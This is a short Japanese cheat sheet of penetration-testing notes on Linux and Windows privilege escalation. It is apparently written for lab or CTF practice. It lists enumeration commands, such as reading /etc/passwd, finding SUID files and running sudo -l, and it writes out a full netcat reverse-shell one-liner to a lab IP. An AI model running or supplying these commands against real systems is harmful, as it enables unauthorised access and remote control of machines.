# Linux 権限昇格

### 基本チェック
`whoami`  
`id`  
`hostname`
`cat /etc/issue`  
`cat /etc/*-release`  
`cat /etc/passwd`  

`ps -aux`  
`ip -a`  
`netstat -ano`  
`/sbin/route`  
`ss -anp`  

`ls -lah /etc/cron*`  
`cat /etc/crontab`
`grep "CRON" /var/log/cron.log`

`dpkg -l`  
`find / -writable -type d 2>/dev/null`

`cat /etc/fstab`  
`mount`  

`/bin/lsblk`  
`lsmod`  
`/sbin/modinfo <module>`  

`find / -perm -u=s -type f 2>/dev/null`  


### 自動ツール
## unix-privesc-check  
`/bin/bash ./unix-privesc-check standard > output.txt`  
`/bin/bash ./unix-privesc-check detailed > output.txt`
http://pentestmonkey.net/tools/audit/unix-privesc-check


### 定期実行プロセスの調査


### sudo設定確認

許可されているコマンドの一覧を表示  
`sudo -l`

###  権限昇格用コマンドまとめ

reverse shell  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4443 >/tmp/f

基本ここで検索すればOK  
https://gtfobins.github.io/

# Windows 権限昇格

### 基本チェック
`whoami`  
`net user`  
`net user <ユーザ名>`  
`hostname`

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`  

`tasklist /SVC`  
`ipconfig /all`  
`route print`  
`netstat -ano`

`netsh advfirewall show currentprofile`  
`netsh advfirewall firewall show rule name=all`  
`schtasks /query /fo LIST /v`

`./windows-exploit-suggester.py --update`
`./windows-exploit-suggester.py --database 2021-03-08-mssb.xls --systeminfo systeminfo.txt`
xlrdがバージョン新しいとエラーはく可能性あり
`pip install xlrd==1.2.0`
